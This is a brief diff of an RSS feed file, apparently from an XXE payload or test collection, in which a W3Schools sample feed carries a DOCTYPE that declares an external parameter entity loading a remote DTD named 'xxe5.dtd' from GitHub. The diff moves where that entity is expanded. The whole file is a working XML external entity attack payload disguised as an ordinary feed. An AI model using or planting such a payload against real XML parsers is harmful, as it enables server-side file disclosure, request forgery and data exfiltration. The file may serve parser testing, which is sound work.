@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [<!ENTITY % xxe_a SYSTEM
-"https://raw.githubusercontent.com/SFLegion/TFS/master/XML/xxe5.dtd"> %xxe_a;]> 
+"https://raw.githubusercontent.com/SFLegion/TFS/master/XML/xxe5.dtd">]> 
 <rss version="2.0">
-
+%xxe_a;
 <channel>
   <title>W3Schools Home Page </title>
   <link>https://www.w3schools.com</link>
